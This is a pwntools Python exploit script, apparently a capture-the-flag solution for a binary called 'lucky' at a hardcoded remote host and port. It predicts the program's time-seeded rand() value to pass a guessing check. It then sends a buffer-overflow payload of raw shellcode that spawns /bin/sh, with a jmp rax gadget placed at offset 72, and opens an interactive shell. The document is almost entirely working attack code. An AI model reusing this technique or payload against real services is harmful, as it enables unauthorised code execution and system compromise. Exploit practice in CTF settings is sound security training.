#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './lucky')

host = args.HOST or '34.65.87.36'
port = int(args.PORT or 8084)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = ''''
b *gift+40
'''.format(**locals())

# -- Exploit goes here --
import time
import ctypes

# Load the C standard library (on Unix-based systems, it's usually libc)
libc = ctypes.CDLL("libc.so.6")

# Step 1: Get the current time (seconds since epoch)
current_time = int(time.time())  # Get the current epoch time in seconds

# Step 2: Seed the C random number generator with the current time
libc.srand(current_time)

# Step 3: Generate the random number (equivalent of C's rand())
rand_value = libc.rand()

# Step 4: Take modulo 1000 to get the lucky number
num = rand_value % 1000

io = start()

io.sendlineafter(b"(0-999): ", str(num).encode())


jmp_rax = 0x000000000040111c
log.info(jmp_rax)

# shell = asm(shellcraft.sh())

shell = "\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"

pay = flat({
    0: shell,
    72: jmp_rax
})

log.info(pay)
 
io.recv()
io.sendline(pay)

log.info(len(pay))

io.interactive()

